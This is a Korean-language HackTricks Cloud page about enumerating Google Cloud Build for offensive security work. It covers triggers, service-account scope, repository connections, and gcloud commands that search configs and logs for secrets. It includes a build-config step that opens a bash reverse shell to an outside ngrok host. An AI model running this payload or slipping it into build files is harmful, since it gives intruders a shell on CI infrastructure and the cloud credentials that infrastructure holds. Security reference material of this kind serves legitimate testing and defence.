# GCP - Cloud Build Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 <strong>제로에서 영웅까지 AWS 해킹을 배워보세요</strong>!<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에서 광고를 보고 싶거나 HackTricks를 PDF로 다운로드하려면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 기본 정보

Google Cloud Build는 **소프트웨어 빌드** 및 릴리스 프로세스를 자동화하는 관리형 CI/CD 플랫폼으로, **소스 코드 저장소**와 통합되며 다양한 프로그래밍 언어를 지원합니다. 개발자는 코드를 **자동으로 빌드, 테스트 및 배포**할 수 있으며, 빌드 단계와 워크플로를 사용자 정의할 수 있는 유연성을 제공합니다.

각 Cloud Build 트리거는 **Cloud Repository에 연결**되거나 외부 저장소(Github, Bitbucket 및 Gitlab)와 직접 연결됩니다.

{% hint style="success" %}
여기나 Cloud Repositories에서 Github/Bitbucket 토큰을 도용할 수 있는 방법을 볼 수 없었습니다. 저장소가 다운로드되면 [https://source.cloud.google.com/](https://source.cloud.google.com/) URL을 통해 액세스되며, Github는 클라이언트에 의해 액세스되지 않습니다.
{% endhint %}

### 이벤트

Cloud Build는 다음과 같은 경우에 트리거될 수 있습니다:

* **브랜치에 푸시**: 브랜치 지정
* **새로운 태그 푸시**: 태그 지정
* **풀 리퀘스트**: PR을 받는 브랜치 지정
* **수동 호출**
* **Pub/Sub 메시지**: 토픽 지정
* **Webhook 이벤트**: HTTPS URL을 노출하고 요청은 비밀로 인증되어야 함

### 실행

3가지 옵션이 있습니다:

* 명령어를 지정하는 yaml/json. 일반적으로: `/cloudbuild.yaml`
* 웹 콘솔 및 CLI에서 "인라인"으로 지정할 수 있는 하나의 옵션
* 가장 일반적인 옵션
* 인증되지 않은 액세스에 관련이 있음
* 빌드를 위한 **Dockerfile**
* 빌드를 위한 **Buildpack**

### SA 권한

**서비스 계정은 `cloud-platform` 범위를 갖고 있으므로 모든 권한을 사용할 수 있습니다.** **SA가 지정되지 않은 경우**(제출할 때와 같이) **기본 SA** `<proj-number>@cloudbuild.gserviceaccount.com`이 **사용됩니다.**

기본적으로 권한이 없지만 쉽게 권한을 부여할 수 있습니다:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 승인

Cloud Build를 구성하여 빌드 실행에 대한 **승인을 요구**할 수 있습니다(기본적으로 비활성화).

### 연결 및 저장소

연결은 다음을 통해 생성할 수 있습니다:

* **GitHub:** 권한을 요청하는 OAuth 프롬프트가 표시되며, **Github 토큰을 가져오기 위한** 권한을 요청합니다. 이 토큰은 **Secret Manager에 저장**됩니다.
* **GitHub Enterprise:** **GithubApp**을 설치하도록 요청합니다. GitHub Enterprise 호스트에서 **인증 토큰**이 생성되어 이 프로젝트에 **Secret Manager** 비밀로 저장됩니다.
* **GitLab / Enterprise:** API 액세스 토큰과 읽기 API 액세스 토큰을 **제공**해야 합니다. 이 토큰은 **Secret Manager에 저장**됩니다.

연결이 생성되면 Github 계정이 액세스할 수 있는 저장소를 연결에 사용할 수 있습니다.

이 옵션은 다음 버튼을 통해 사용할 수 있습니다:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
이 방법으로 연결된 저장소는 **2세대를 사용하는 트리거에서만 사용 가능**합니다.
{% endhint %}

### 저장소 연결

이는 **`연결`**과 동일하지 않습니다. 이는 **Github 또는 Bitbucket** 저장소에 **액세스하는 다른 방법**을 제공하지만 **연결 개체를 생성하지 않고, 저장소 개체(1세대)를 생성**합니다.

이 옵션은 다음 버튼을 통해 사용할 수 있습니다:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 저장소

가끔 Cloud Build는 **트리거의 파일을 저장하기 위해 새로운 저장소를 생성**할 수 있습니다. 이는 GCP가 제공하는 예제에서 발생합니다.
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
### 쉘 획득하기
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### 열거

빌드 구성 및 로그에서 **민감한 정보를 찾을 수 있습니다**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### 권한 상승

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### 인증되지 않은 액세스

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### 사후 침투

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 **HackTricks에서 광고**하거나 **PDF로 HackTricks 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>
